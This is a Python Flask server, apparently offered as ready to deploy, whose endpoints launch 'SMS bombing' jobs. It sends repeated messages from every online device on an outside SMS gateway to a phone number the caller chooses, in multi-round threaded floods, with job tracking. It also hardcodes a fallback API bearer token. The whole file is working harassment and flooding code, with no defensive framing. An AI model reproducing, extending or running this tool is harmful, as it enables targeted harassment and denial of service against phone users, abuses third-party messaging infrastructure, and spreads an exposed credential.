#!/usr/bin/env python3
"""
RAX FINAL API — Production Ready
Features:
- Dynamic target/message (passed in requests)
- Emergency stop
- Duplicate bombing prevention
- Multi-user support
- Job tracking
"""

import os
import sys
import time
import json
import random
import threading
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# CONFIG
# ============================================================

app = Flask(__name__)
CORS(app)

BASE_URL = "https://sms-rax.ai.studio"
MAX_CONCURRENT_JOBS = 10
DEFAULT_ROUNDS = 3
DEFAULT_THREADS = 30

# ============================================================
# TOKEN MANAGEMENT
# ============================================================

def load_tokens_from_env():
    tokens = []
    for i in range(1, 21):  # Support up to 20 tokens
        token = os.environ.get(f"RAX_TOKEN_{i}")
        if token:
            tokens.append(token)
    return tokens

def load_tokens_from_file():
    try:
        with open("rax_tokens.json", 'r') as f:
            data = json.load(f)
            if isinstance(data, list):
                return [t.get('token') for t in data if t.get('token')]
    except:
        pass
    return []

def get_valid_token():
    tokens = load_tokens_from_env()
    if not tokens:
        tokens = load_tokens_from_file()
    if not tokens:
        return os.environ.get("FALLBACK_TOKEN", "b47d70013f4bdb4109a6e01f423ff82810157fc2cbbfe9cdd8040efcbe97ed54")
    return tokens[0]

def get_all_tokens():
    tokens = load_tokens_from_env()
    if not tokens:
        tokens = load_tokens_from_file()
    if not tokens:
        fallback = os.environ.get("FALLBACK_TOKEN")
        if fallback:
            tokens = [fallback]
    return tokens

# ============================================================
# DEVICE MANAGEMENT
# ============================================================

def get_online_devices(token):
    try:
        resp = requests.get(
            f"{BASE_URL}/api/devices?key=CyberDemo",
            headers={"Authorization": f"Bearer {token}"},
            timeout=10
        )
        if resp.status_code == 200:
            data = resp.json()
            return [d.get('id') for d in data if d.get('status', False)]
    except:
        pass
    return []

def get_all_online_devices():
    all_devices = []
    tokens = get_all_tokens()
    for token in tokens:
        devices = get_online_devices(token)
        all_devices.extend(devices)
    return list(set(all_devices))

# ============================================================
# SMS SENDING
# ============================================================

def send_sms(device_id, to, message, token, retry=2):
    url = f"{BASE_URL}/api/send"
    payload = {"deviceId": device_id, "phone": to, "message": message}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    for attempt in range(retry + 1):
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('success'):
                    return {"success": True, "device": device_id}
            time.sleep(0.5 * (attempt + 1))
        except:
            pass
    return {"success": False, "device": device_id}

# ============================================================
# JOB MANAGER — Thread-safe, tracks all jobs
# ============================================================

class JobManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.jobs = {}  # job_id -> job_data
        self.active_targets = {}  # target -> job_id
        self.running = True
        self.cleanup_thread = None
    
    def start_cleanup(self):
        """Background thread to clean up completed jobs."""
        def clean():
            while self.running:
                time.sleep(5)
                with self.lock:
                    to_remove = []
                    for job_id, job in self.jobs.items():
                        if job['status'] in ['completed', 'stopped', 'failed']:
                            # Remove if completed more than 60 seconds ago
                            if job.get('finished_at') and (time.time() - job['finished_at'] > 60):
                                to_remove.append(job_id)
                    for job_id in to_remove:
                        del self.jobs[job_id]
                        # Also remove from active_targets
                        for target, jid in list(self.active_targets.items()):
                            if jid == job_id:
                                del self.active_targets[target]
        self.cleanup_thread = threading.Thread(target=clean, daemon=True)
        self.cleanup_thread.start()
    
    def create_job(self, job_type, target, message, **kwargs):
        with self.lock:
            # Check if target is already being bombed
            if target in self.active_targets:
                existing_job_id = self.active_targets[target]
                return {
                    "success": False,
                    "error": f"Number {target} is already being bombed (Job ID: {existing_job_id})",
                    "existing_job_id": existing_job_id
                }
            
            # Check concurrent job limit
            active_jobs = sum(1 for j in self.jobs.values() if j['status'] == 'running')
            if active_jobs >= MAX_CONCURRENT_JOBS:
                return {
                    "success": False,
                    "error": f"Maximum concurrent jobs ({MAX_CONCURRENT_JOBS}) reached. Please try later."
                }
            
            job_id = f"job_{int(time.time())}_{random.randint(100, 999)}"
            
            job_data = {
                "job_id": job_id,
                "type": job_type,
                "target": target,
                "message": message,
                "status": "pending",
                "created_at": datetime.now().isoformat(),
                "started_at": None,
                "finished_at": None,
                "stop_flag": False,
                "thread": None,
                "result": None,
                "kwargs": kwargs,
                "sent": 0,
                "failed": 0,
                "total": 0,
                "progress": 0
            }
            
            self.jobs[job_id] = job_data
            self.active_targets[target] = job_id
            
            return {"success": True, "job_id": job_id, "job": job_data}
    
    def start_job(self, job_id, target_function, *args, **kwargs):
        """Start the job in a background thread."""
        with self.lock:
            if job_id not in self.jobs:
                return {"success": False, "error": "Job not found"}
            
            job = self.jobs[job_id]
            
            def run():
                try:
                    job['status'] = 'running'
                    job['started_at'] = datetime.now().isoformat()
                    
                    result = target_function(job, *args, **kwargs)
                    
                    job['status'] = 'completed'
                    job['result'] = result
                    job['finished_at'] = datetime.now().isoformat()
                    
                    # Remove from active_targets
                    with self.lock:
                        target = job['target']
                        if target in self.active_targets and self.active_targets[target] == job_id:
                            del self.active_targets[target]
                except Exception as e:
                    job['status'] = 'failed'
                    job['result'] = {"error": str(e)}
                    job['finished_at'] = datetime.now().isoformat()
                    with self.lock:
                        target = job['target']
                        if target in self.active_targets and self.active_targets[target] == job_id:
                            del self.active_targets[target]
            
            job['thread'] = threading.Thread(target=run, daemon=True)
            job['thread'].start()
            
            return {"success": True}
    
    def stop_job(self, job_id):
        with self.lock:
            if job_id not in self.jobs:
                return {"success": False, "error": "Job not found"}
            
            job = self.jobs[job_id]
            if job['status'] not in ['running', 'pending']:
                return {"success": False, "error": f"Job is already {job['status']}"}
            
            job['stop_flag'] = True
            job['status'] = 'stopping'
            
            # Remove from active_targets immediately
            target = job['target']
            if target in self.active_targets and self.active_targets[target] == job_id:
                del self.active_targets[target]
            
            return {"success": True, "job_id": job_id, "message": "Stop signal sent"}
    
    def stop_all(self):
        with self.lock:
            stopped = []
            for job_id, job in self.jobs.items():
                if job['status'] in ['running', 'pending']:
                    job['stop_flag'] = True
                    job['status'] = 'stopping'
                    # Remove from active_targets
                    target = job['target']
                    if target in self.active_targets and self.active_targets[target] == job_id:
                        del self.active_targets[target]
                    stopped.append(job_id)
            return {"success": True, "stopped": stopped, "count": len(stopped)}
    
    def stop_target(self, target):
        with self.lock:
            if target not in self.active_targets:
                return {"success": False, "error": f"No active bombing for {target}"}
            
            job_id = self.active_targets[target]
            job = self.jobs.get(job_id)
            if job and job['status'] in ['running', 'pending']:
                job['stop_flag'] = True
                job['status'] = 'stopping'
                del self.active_targets[target]
                return {"success": True, "job_id": job_id, "message": f"Stopping bomb on {target}"}
            
            return {"success": False, "error": "Job not found or already stopped"}
    
    def get_job(self, job_id):
        with self.lock:
            return self.jobs.get(job_id)
    
    def get_all_jobs(self, limit=20):
        with self.lock:
            jobs = list(self.jobs.values())
            jobs.sort(key=lambda x: x.get('created_at', ''), reverse=True)
            return jobs[:limit]
    
    def get_active_targets(self):
        with self.lock:
            return list(self.active_targets.keys())

# ============================================================
# BOMBING FUNCTIONS (run inside job threads)
# ============================================================

def spread_bomb(job, devices=None, threads=30):
    """Send one message from every online device."""
    if devices is None:
        devices = get_all_online_devices()
    
    if not devices:
        job['result'] = {"error": "No online devices available"}
        job['status'] = 'failed'
        return {"error": "No online devices available"}
    
    tokens = get_all_tokens()
    if not tokens:
        job['result'] = {"error": "No tokens available"}
        job['status'] = 'failed'
        return {"error": "No tokens available"}
    
    total = len(devices)
    job['total'] = total
    sent = 0
    failed = 0
    
    # Assign tokens to devices round-robin
    device_token_map = {}
    for i, device_id in enumerate(devices):
        device_token_map[device_id] = tokens[i % len(tokens)]
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        for device_id in devices:
            token = device_token_map[device_id]
            futures[executor.submit(send_sms, device_id, job['target'], job['message'], token)] = device_id
        
        for future in as_completed(futures):
            if job.get('stop_flag', False):
                break
            result = future.result()
            if result.get('success'):
                sent += 1
            else:
                failed += 1
            job['sent'] = sent
            job['failed'] = failed
            job['progress'] = round((sent + failed) / total * 100, 1)
    
    # Calculate if stopped early
    if job.get('stop_flag', False):
        job['status'] = 'stopped'
        return {
            "sent": sent,
            "failed": failed,
            "total": total,
            "stopped": True,
            "message": f"Stopped early after {sent + failed} messages"
        }
    
    return {
        "sent": sent,
        "failed": failed,
        "total": total,
        "stopped": False,
        "success_rate": round(sent / total * 100, 1) if total > 0 else 0
    }

def round_bomb(job, devices=None, threads=30, rounds=3, delay=2):
    """Send multiple rounds of spread bombing."""
    if devices is None:
        devices = get_all_online_devices()
    
    if not devices:
        return {"error": "No online devices available"}
    
    total_messages = 0
    total_sent = 0
    total_failed = 0
    
    for round_num in range(1, rounds + 1):
        if job.get('stop_flag', False):
            break
        
        # Run a spread bomb for this round
        round_result = spread_bomb(job, devices, threads)
        
        total_sent += round_result.get('sent', 0)
        total_failed += round_result.get('failed', 0)
        total_messages += round_result.get('total', len(devices))
        
        job['sent'] = total_sent
        job['failed'] = total_failed
        job['total'] = total_messages
        job['progress'] = round(round_num / rounds * 100, 1)
        
        if round_num < rounds:
            time.sleep(delay)
    
    if job.get('stop_flag', False):
        return {
            "sent": total_sent,
            "failed": total_failed,
            "total": total_messages,
            "rounds_completed": round_num - 1,
            "stopped": True
        }
    
    return {
        "sent": total_sent,
        "failed": total_failed,
        "total": total_messages,
        "rounds_completed": rounds,
        "stopped": False,
        "success_rate": round(total_sent / total_messages * 100, 1) if total_messages > 0 else 0
    }

# ============================================================
# GLOBAL JOB MANAGER
# ============================================================

job_manager = JobManager()
job_manager.start_cleanup()

# ============================================================
# API ENDPOINTS
# ============================================================

@app.route('/api/health', methods=['GET'])
def health():
    """Health check with status."""
    active_jobs = sum(1 for j in job_manager.jobs.values() if j['status'] == 'running')
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now().isoformat(),
        "active_jobs": active_jobs,
        "active_targets": job_manager.get_active_targets(),
        "total_devices": len(get_all_online_devices()),
        "tokens_available": len(get_all_tokens())
    })

@app.route('/api/devices', methods=['GET'])
def list_devices():
    """List online devices."""
    devices = get_all_online_devices()
    return jsonify({
        "total": len(devices),
        "devices": devices[:100]  # Show first 100
    })

@app.route('/api/spread', methods=['POST'])
def start_spread():
    """Start a spread bomb — one message from every device."""
    data = request.json or {}
    to = data.get('to') or data.get('number')
    message = data.get('message')
    threads = int(data.get('threads', DEFAULT_THREADS))
    
    if not to or not message:
        return jsonify({"error": "Missing 'to' or 'message' fields"}), 400
    
    # Create job
    result = job_manager.create_job("spread", to, message, threads=threads)
    if not result['success']:
        return jsonify(result), 409 if "already being bombed" in result.get('error', '') else 429
    
    job_id = result['job_id']
    
    # Start job
    job_manager.start_job(job_id, spread_bomb, threads=threads)
    
    return jsonify({
        "success": True,
        "job_id": job_id,
        "message": f"Spread bomb started on {to}",
        "status": "running",
        "check_status": f"/api/jobs/{job_id}"
    })

@app.route('/api/bomb', methods=['POST'])
def start_bomb():
    """Start a multi-round bomb."""
    data = request.json or {}
    to = data.get('to') or data.get('number')
    message = data.get('message')
    rounds = int(data.get('rounds', DEFAULT_ROUNDS))
    threads = int(data.get('threads', DEFAULT_THREADS))
    delay = int(data.get('delay', 2))
    
    if not to or not message:
        return jsonify({"error": "Missing 'to' or 'message' fields"}), 400
    
    if rounds < 1 or rounds > 10:
        return jsonify({"error": "Rounds must be between 1 and 10"}), 400
    
    # Create job
    result = job_manager.create_job("bomb", to, message, rounds=rounds, threads=threads, delay=delay)
    if not result['success']:
        return jsonify(result), 409 if "already being bombed" in result.get('error', '') else 429
    
    job_id = result['job_id']
    
    # Start job
    job_manager.start_job(job_id, round_bomb, threads=threads, rounds=rounds, delay=delay)
    
    return jsonify({
        "success": True,
        "job_id": job_id,
        "message": f"Bomb started on {to} with {rounds} rounds",
        "status": "running",
        "check_status": f"/api/jobs/{job_id}"
    })

@app.route('/api/send', methods=['POST'])
def send_single():
    """Send a single SMS."""
    data = request.json or {}
    to = data.get('to') or data.get('number')
    message = data.get('message')
    
    if not to or not message:
        return jsonify({"error": "Missing 'to' or 'message' fields"}), 400
    
    # Find a valid token and device
    token = get_valid_token()
    if not token:
        return jsonify({"error": "No valid token available"}), 503
    
    devices = get_all_online_devices()
    if not devices:
        return jsonify({"error": "No online devices available"}), 503
    
    device_id = random.choice(devices)
    
    result = send_sms(device_id, to, message, token)
    
    if result.get('success'):
        return jsonify({
            "success": True,
            "to": to,
            "from": device_id,
            "message": message[:50] + "...",
            "timestamp": datetime.now().isoformat()
        })
    else:
        return jsonify({
            "success": False,
            "error": result.get('error', 'SMS failed'),
            "to": to
        }), 500

@app.route('/api/jobs', methods=['GET'])
def list_jobs():
    """List all jobs."""
    limit = int(request.args.get('limit', 20))
    jobs = job_manager.get_all_jobs(limit)
    return jsonify({
        "total": len(jobs),
        "jobs": jobs
    })

@app.route('/api/jobs/<job_id>', methods=['GET'])
def get_job(job_id):
    """Get job status."""
    job = job_manager.get_job(job_id)
    if not job:
        return jsonify({"error": "Job not found"}), 404
    return jsonify(job)

@app.route('/api/stop/<job_id>', methods=['POST'])
def stop_job(job_id):
    """Emergency stop a specific job."""
    result = job_manager.stop_job(job_id)
    if not result['success']:
        return jsonify(result), 404
    return jsonify(result)

@app.route('/api/stop/all', methods=['POST'])
def stop_all():
    """Emergency stop all jobs."""
    result = job_manager.stop_all()
    return jsonify(result)

@app.route('/api/stop/number/<target>', methods=['POST'])
def stop_target(target):
    """Stop all bombing on a specific number."""
    result = job_manager.stop_target(target)
    if not result['success']:
        return jsonify(result), 404
    return jsonify(result)

@app.route('/api/active', methods=['GET'])
def active_targets():
    """Get list of currently active targets."""
    targets = job_manager.get_active_targets()
    return jsonify({
        "active_targets": targets,
        "count": len(targets)
    })

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║  🚀 RAX FINAL API                                       ║
    ║  Production ready — Multi-user, Emergency stop          ║
    ║  Tokens: {}                                            ║
    ╚══════════════════════════════════════════════════════════╝
    """.format(len(get_all_tokens())))
    
    port = int(os.environ.get("PORT", 5001))
    debug = os.environ.get("DEBUG", "false").lower() == "true"
    
    # For Render deployment, use gunicorn
    if os.environ.get("RENDER"):
        print("[*] Running on Render with gunicorn")
        app.run(host="0.0.0.0", port=port, debug=False)
    else:
        app.run(host="0.0.0.0", port=port, debug=debug)
